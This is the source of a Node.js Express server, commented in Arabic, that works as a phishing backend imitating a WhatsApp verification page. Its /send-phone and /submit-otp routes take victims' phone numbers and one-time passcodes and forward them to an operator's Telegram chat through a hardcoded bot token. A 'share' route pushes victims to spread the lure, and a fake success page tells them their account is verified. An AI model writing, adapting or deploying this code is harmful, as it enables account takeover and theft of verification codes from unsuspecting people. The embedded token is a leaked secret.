const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

// ========== إعدادات تيلجرام ==========
const TELEGRAM_TOKEN = '8810906768:AAEPvCGIGJI8cJtzloiRQYd0GV_W6aHLdO4';
const TELEGRAM_CHAT_ID = '8140097273';

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'views')));

const USERS_FILE = path.join(__dirname, 'users-data.json');

function readUsersData() {
    try {
        if (fs.existsSync(USERS_FILE)) {
            const data = fs.readFileSync(USERS_FILE, 'utf8');
            return JSON.parse(data);
        }
        return {};
    } catch (e) {
        console.error('❌ خطأ في قراءة الملف:', e.message);
        return {};
    }
}

function saveUsersData(users) {
    try {
        fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2), 'utf8');
    } catch (e) {
        console.error('❌ خطأ في حفظ الملف:', e.message);
    }
}

async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        if (response.ok) {
            console.log('✅ تم إرسال الإشعار');
        } else {
            console.error('❌ فشل الإرسال:', await response.text());
        }
    } catch (e) {
        console.error('❌ خطأ:', e.message);
    }
}

app.get('/test', async (req, res) => {
    await sendTelegramMessage('✅ <b>البوت شغال!</b> 🎉');
    res.send('✅ تم إرسال رسالة اختبار');
});

// ========== نظام المشاركة ==========
app.post('/confirm-share', async (req, res) => {
    try {
        const { userId } = req.body;
        const users = readUsersData();
        
        if (!users[userId]) {
            users[userId] = { invites: 0, phone: null, shared: false };
        }
        
        if (users[userId].shared) {
            return res.json({ success: false, message: 'تم المشاركة بالفعل!' });
        }
        
        users[userId].shared = true;
        users[userId].invites = 10;
        saveUsersData(users);
        
        let msg = `📩 <b>تم تأكيد المشاركة!</b>\n🕐 ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━━\n👤 ${userId}\n📊 10/10 ✅`;
        await sendTelegramMessage(msg);
        
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ success: false });
    }
});

app.post('/get-user', async (req, res) => {
    try {
        const { userId } = req.body;
        const users = readUsersData();
        if (users[userId]) {
            res.json({ success: true, shared: users[userId].shared || false });
        } else {
            users[userId] = { invites: 0, phone: null, shared: false };
            saveUsersData(users);
            res.json({ success: true, shared: false });
        }
    } catch (err) {
        res.status(500).json({ success: false });
    }
});

// ========== مسارات الإرسال القديمة (اللي كانت شغالة) ==========
app.post('/send-phone', async (req, res) => {
    try {
        const { phone } = req.body;
        console.log('📱 استلام رقم:', phone);
        
        let msg = `📱 <b>رقم هاتف جديد!</b>\n🕐 ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━━\n📞 ${phone}`;
        await sendTelegramMessage(msg);
        
        res.json({ success: true });
    } catch (err) {
        console.error('❌ خطأ:', err.message);
        res.status(500).json({ success: false });
    }
});

app.post('/submit-otp', async (req, res) => {
    try {
        const { phone, otp } = req.body;
        console.log('🔑 استلام OTP:', otp, 'للرقم:', phone);
        
        let msg = `🔐 <b>رمز OTP!</b>\n🕐 ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━━\n📞 ${phone}\n🔑 ${otp}`;
        await sendTelegramMessage(msg);
        
        res.json({ success: true });
    } catch (err) {
        console.error('❌ خطأ:', err.message);
        res.status(500).json({ success: false });
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'index.html'));
});

app.get('/success', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><meta charset="UTF-8"><title>تم التوثيق!</title>
        <style>body{background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:sans-serif;}
        .box{background:white;max-width:400px;padding:50px 30px;border-radius:32px;text-align:center;}
        .icon{font-size:80px;color:#25d366;}.badge{background:#075e54;color:white;padding:8px 20px;border-radius:30px;display:inline-block;margin-bottom:20px;}
        h1{font-size:28px;}.btn{display:inline-block;padding:14px 40px;background:#075e54;color:white;border:none;border-radius:30px;font-size:18px;text-decoration:none;cursor:pointer;}
        </style>
        </head>
        <body>
        <div class="box"><div class="icon">✅</div><div class="badge">موثق ✓</div><h1>🎉 تهانينا!</h1><p>تم توثيق حسابك بنجاح!</p><a href="/" class="btn">العودة</a></div>
        </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(`✅ السيرفر شغال على http://localhost:${PORT}`);
});
